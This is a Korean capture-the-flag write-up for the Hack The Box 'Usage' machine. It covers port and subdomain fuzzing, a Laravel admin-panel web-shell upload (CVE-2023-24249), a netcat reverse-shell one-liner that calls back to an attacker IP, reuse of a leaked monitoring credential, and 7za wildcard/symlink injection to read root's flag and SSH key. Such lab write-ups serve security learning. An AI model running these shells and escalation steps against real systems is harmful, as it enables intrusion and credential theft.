# HTB-USAGE
```bash
OS: Linux
DATE: 26.10.01
DIFFICULTY: Easy
```

## RECON
**nmap**: 초기 정찰을 위해 nmap으로 전체 포트 스캔, 상세 검사, UDP 포트 검사까지 실시했다.
```bash
nmap -p- -T4 IP
```
```bash
nmap -sC -sV -p 22,80 IP
```
```bash
sudo nmap -sUV --top-ports 100 IP
```
검사 결과 22(SSH), 80(HTTP) 포트가 나왔다. 따라서 초기 정찰을 위해 HTTP 서비스에 접근했다. 접근 이후 서브도메인과 웹 디렉토리 FUZZING을 진행했다.
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://usage.htb/ -H "Host: FUZZ.usage.htb" -fs 178
```
```bash
ffuf -u http://usage.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -r -c
```
```bash
ffuf -u http://usage.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -c -r
```
검사 결과 **login** 페이지와 **dashboard** 등의 페이지가 있다는 것을 알게 되었다. 이후 서브도메인 쪽에서도 admin이라는 서브도메인을 찾을 수 있어 바로 /etc/hosts에 등록해주었다.
```bash
sudo nano /etc/hosts
```

## Initial Access
usage.htb에 처음 접속한 결과 회원가입과 로그인을 할 수 있는 페이지가 있었다. 이후 admin.usage.htb에 접속하여 관리자 패널이라는 것도 알게 되었다.

![panel](attach_real/Pasted%20image%2020261005132158.png)

admin panel을 확인한 결과 Laravel 프레임워크로 돌아가는 것 같았다. 또한 1.8.17이라는 버전 정보도 얻게 되었다. 따라서 해당 프레임워크 버전 취약점을 찾아본 결과 **CVE-2023-24249**라는 취약점이 있다는 것을 알게 되었다. 해당 취약점은 웹쉘을 올려 RCE가 가능한 취약점이었다. 따라서 [PoC](https://github.com/ldb33/CVE-2023-24249-PoC/blob/main/CVE-2023-24249.py)를 받아 실행했다.
```bash
python3 CVE-2023-24249.py
[+] Web shell uploaded to http://admin.usage.htb/uploads/images/shell.php
```
이후 해당 경로로 브라우저에 접속한 결과 실패했다. 이후 **curl**로 시도한 결과도 실패했다. 따라서 다시 한 번 PoC를 실행하고 curl로 보낸 결과 RCE에 성공했다.
```bash
curl "http://admin.usage.htb/uploads/images/shell.php?c=id"

uid=1000(dash) gid=1000(dash) groups=1000(dash)
```
바로 쉘을 얻기 위해 리버스 쉘을 추가했다.
```bash
curl "http://admin.usage.htb/uploads/images/shell.php?c=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f%7C/bin/sh%20-i%202%3E%261%7Cnc%20IP%204445%20%3E/tmp/f"
```
따라서 dash 유저의 쉘을 얻게 되었다.

![user](attach_real/Pasted%20image%2020260930235850.png)

user 쉘을 얻고 계속해서 권한 상승 경로를 찾아본 결과 **xander**라는 유저가 더 있다는 것을 알게 되었다. dash 디렉토리에서 숨긴 파일 목록을 확인한 결과 **.monitrc**라는 파일을 알게 되었다. 해당 파일을 출력한 결과
```bash
#Monitoring Interval in Seconds
set daemon  60

#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd

#Apache
check process apache with pidfile "/var/run/apache2/apache2.pid"
    if cpu > 80% for 2 cycles then alert


#System Monitoring 
check system usage
    if memory usage > 80% for 2 cycles then alert
    if cpu usage (user) > 70% for 2 cycles then alert
        if cpu usage (system) > 30% then alert
    if cpu usage (wait) > 20% then alert
    if loadavg (1min) > 6 for 2 cycles then alert 
    if loadavg (5min) > 4 for 2 cycles then alert
    if swap usage > 5% then alert

check filesystem rootfs with path /
       if space usage > 80% then alert
```
어떤 누군가의 크리덴셜을 얻게 되었다. 해당 패스워드로 xander 유저 SSH에 접근한 결과 성공했다.
```bash
ssh xander@usage.htb
```

## Privilege Escalation
유저 쉘을 얻은 후 권한 상승 경로를 찾아보았다. `sudo -l`을 시도한 결과 **NOPASSWD: /usr/bin/usage_management**로 usage_management를 사용할 수 있었다. 먼저 해당 프로그램을 실행한 결과 1, 2, 3을 선택할 수 있었다.
```bash
/usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
```
1번을 선택하면 **/var/backups/project.zip** 관련 오류가 나면서 종료되고, 2, 3은 권한이 없거나 패스워드 리셋 등 여러 메시지가 떴다. 따라서 이후 strings로 바이너리를 확인해보았다.
```bash
strings /usr/bin/usage_management
/var/www/html                                                                                                                 
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *                                                                  
Error changing working directory to /var/www/html
```
따라서 바로 **Wildcard Injection** 취약점이 있을 수 있다고 생각했다. 해당 취약점은 sudo로 실행되는 백업 스크립트가 `7za a ...*`에서 와일드카드를 사용하기 때문에 이용할 수 있었다. 공격 원리는 7-zip은 @파일명 인자를 받아 그 파일을 열고, 각 줄을 압축할 대상 파일 경로로 읽는다. 그런데 그 줄에 적힌 경로를 디스크에서 찾지 못하면 그 경로, 즉 파일 내용을 에러 메시지로 그대로 출력한다.

따라서 여기에 심볼릭 링크를 결합하면 민감한 root 파일 등을 확인할 수 있다. 권한 상승을 위해 /var/www/html에 들어갔다. 이 위치인 이유는 7za가 실행되는 바로 그 디렉토리이기 때문이다. 따라서 `cd /var/www/html`로 해당 디렉토리에 접근했다. 이후 심볼릭 링크를 만들어주었다.
```bash
ln -s /root/root.txt myfile
```
이후 **@myfile**이라는 빈 파일을 생성해주었다.
```bash
touch @myfile
```
이후 sudo로 /usr/bin/usage_management를 실행한 후 1번 옵션을 선택하여 루트 파일을 읽을 수 있었다.
```bash
sudo /usr/bin/usage_management

Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7ad2f632c3775e55991611adf1454b4d : No more files
```
루트 권한은 얻었지만 쉘을 얻지 못해서, `/root/.ssh/id_rsa` 파일을 출력하여 SSH로 접속하려 했다.
```bash
rm myfile
```
```bash
ln -s /root/.ssh/id_rsa evil
```
```bash
touch @evil
```
다시 한 번 루트 권한으로 프로그램을 실행하여 root id_rsa를 얻게 되었다. 이것을 로컬에 저장한 후 No more files 문구를 지워주고 SSH 접근을 시도했다.
```bash
chmod 600
```
```bash
ssh -i id_rsa root@usage.htb
```
하지만 접근이 불가능했다. 이유를 알고 보니 `error in libcrypto: unsupported`, 즉 맨 마지막 줄 뒤에 줄바꿈이 없어서 접속이 불가능했다. 따라서 줄바꿈을 해준 후 다시 접근한 결과 root 쉘을 얻을 수 있었다.
```bash
echo >> id_rsa
```
```bash
ssh -i id_rsa root@usage.htb
```

![root](attach_real/Pasted%20image%2020261005132142.png)

## New Inform
- 서브도메인을 추가하지 않으면 접근 불가, 즉 400, 404 페이지가 뜰 수 있다. 꼭 추가하자.
- Laravel: PHP 프레임워크.
- 웹쉘이 시간이 지나면 삭제될 수 있다.
- 와일드카드 인젝션: 먼저 와일드카드란 쉘에서 여러 파일 이름을 한꺼번에 가리키는 특수 기호 `*`다. 폴더에 예를 들어 a.txt b.txt가 있다면 *은 이것들 전부로 펼쳐진다. 이 펼치는 작업은 프로그램이 아니라 쉘이 한다는 게 중요하다. 쉘이 먼저 *를 파일 이름들로 바꿔서 ls에 넘겨준다. 여기서 문제는 쉘은 파일 이름과 옵션을 구분하지 못한다는 것이다. 보통 프로그램 명령은 `프로그램 -옵션 파일1 파일2`이렇다. 근데 만약 파일 이름이 `-`로 시작한다면 어떻게 될까? 만약 -rf라는 파일명이 있다고 가정하면, `rm * -> rm -rf important.txt`가 되고, rm은 -rf를 파일 이름이 아니라 강제 재귀 삭제 옵션으로 실행해버린다. 이것이 와일드카드 인젝션의 핵심이다. 이 취약점 성립 조건은 `1. 그 명령이 와일드카드를 사용해야 한다. 안 그러면 내 파일이 인자로 안 들어간다.` `2. 그 디렉토리에 쓰기 권한이 있어야 한다. 악의적 파일명을 만들 수 있어야 하기 때문이다.`
- `*` 즉 와일드카드는 현재 폴더의 모든 파일이라는 뜻이다. 무언가를 생략하는 것이 아니다.
- 7za는 @를 파일 이름이 아니라 @리스트파일이라고 해석한다. 따라서 @myfile을 보고 myfile에서 압축할 파일 목록을 읽으라고 하는 것이다. 내가 파일 이름을 그렇게 설정한 것뿐인데 이것을 옵션으로 받아들이는 것이다.
- id_rsa, 즉 개인키는 마지막에 꼭 줄바꿈을 해줘야 한다.
- unsupported: 줄바꿈 오류.